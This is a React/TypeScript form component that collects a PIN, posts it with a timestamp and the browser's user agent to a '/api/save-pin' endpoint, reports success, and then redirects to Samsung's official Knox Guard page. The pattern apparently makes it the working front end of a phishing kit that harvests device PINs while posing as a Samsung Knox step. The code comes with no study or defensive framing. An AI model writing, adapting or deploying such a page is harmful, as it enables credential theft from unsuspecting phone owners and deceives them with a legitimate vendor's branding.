'use client';

import { useState } from 'react';

interface PinEntry {
  pin: string;
  ts: string;
  ua: string;
}

export default function PinForm() {
  const [pin, setPin] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [message, setMessage] = useState('');
  const [messageType, setMessageType] = useState<'error' | 'success'>('error');

  const REDIRECT_URL = 'https://www.samsungknox.com/en/solutions/it-solutions/knox-guard';

  const showMessage = (text: string, type: 'error' | 'success') => {
    setMessage(text);
    setMessageType(type);
    setTimeout(() => {
      setMessage('');
    }, 5000);
  };

  const validatePin = (pinValue: string): string | null => {
    if (!pinValue || pinValue.length < 1) return 'Please enter a PIN.';
    if (pinValue.length > 50) return 'PIN is too long.';
    if (!/^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]+$/.test(pinValue)) {
      return 'PIN contains invalid characters.';
    }
    return null;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const validationError = validatePin(pin);
    if (validationError) {
      showMessage(validationError, 'error');
      return;
    }

    setIsSubmitting(true);

    const entry: PinEntry = {
      pin: pin.trim(),
      ts: new Date().toISOString(),
      ua: navigator.userAgent
    };

    try {
      const response = await fetch('/api/save-pin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(entry)
      });

      if (response.ok) {
        showMessage('PIN submitted successfully!', 'success');
        setPin('');
        // Redirect after a short delay
        setTimeout(() => {
          window.location.href = REDIRECT_URL;
        }, 1500);
      } else {
        const errorData = await response.json();
        showMessage(errorData.error || 'Failed to submit PIN', 'error');
      }
    } catch (err) {
      console.warn('Failed to send PIN to server:', err);
      showMessage('Network error. Please try again.', 'error');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <label htmlFor="pin">Enter PIN</label>
      <input
        id="pin"
        type="password"
        inputMode="numeric"
        autoComplete="one-time-code"
        placeholder="Enter PIN"
        required
        maxLength={50}
        value={pin}
        onChange={(e) => setPin(e.target.value)}
        disabled={isSubmitting}
      />
      <div className="row">
        <button 
          type="submit" 
          disabled={isSubmitting}
          className={isSubmitting ? 'loading' : ''}
        >
          {isSubmitting ? 'Submitting...' : 'Enter'}
        </button>
      </div>
      {message && (
        <div className={messageType} style={{ display: 'block' }}>
          {message}
        </div>
      )}
    </form>
  );
}
